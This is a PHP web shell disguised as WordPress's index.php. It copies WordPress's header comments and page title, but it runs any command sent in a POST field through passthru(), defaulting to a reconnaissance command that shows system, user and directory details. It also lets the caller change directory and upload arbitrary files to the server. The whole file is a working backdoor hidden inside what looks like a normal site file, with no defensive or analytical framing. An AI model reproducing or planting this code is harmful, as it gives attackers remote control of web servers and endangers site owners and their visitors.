<!-- Front to the WordPress application. This file doesn't do anything, but loads -->
<!-- wp-blog-header.php which does and tells WordPress to load the theme.         -->
<html>
<head>
<title>WordPress</title>
</head>
<BODY bgcolor="#000000">
<!-- ngatur direktori -->
<? if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); } ?>
<table>
<tr><td bgcolor=#cccccc>

<!-- eksekusi command dengan passthru -->

<?
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="uname -ar ; pwd ; id ; ls -la ;"; }
echo "<b>";
echo "<div align=left><textarea name=report cols=70 rows=15>";
echo "".passthru($_POST['cmd'])."";
echo "</textarea></div>";
echo "</b>";
?>
</td></tr></table>
<!-- upload file -->
<?
if (($HTTP_POST_FILES["filenyo"]!=="") AND ($HTTP_POST_FILES["filenyo"]))
{
copy($HTTP_POST_FILES["filenyo"][tmp_name],
$_POST['dir']."/".$HTTP_POST_FILES["filenyo"][name])
or print("<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=arial>
<div>file gak isa di uplod ".$HTTP_POST_FILES["filenyo"][name]."</div></font></td></tr></table>");
}
?>
<table width=100% cellpadding=0 cellspacing=0 >
<tr><td>

<!-- form eksekusi command -->

<?
echo "<form name=command method=post>";
echo "<font face=Verdana size=1 color=red>";
echo "<b>[CmD ]</b><input type=text name=cmd size=33>  ";
if ((!$_POST['dir']) OR ($_POST['dir']==""))
{ echo " <b>[Dir]</b><input type=text name=dir size=40 value=".exec("pwd").">"; }
else { echo "<input type=text name=dir size=40 value=".$_POST['dir'].">"; }
echo "  <input type=submit name=submit value=\"0k\">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
<table width=100% cellpadding=0 cellspacing=0 >

<!-- form upload -->

<?
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo "<font face=Verdana size=1 color=red>";
echo "<b> [EcHo]</b>";
echo "<input type=file name=filenyo size=70> ";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=70 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=70 value=".$_POST['dir'].">"; }
echo "<input type=submit name=submit value=\"0k\">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
</html>
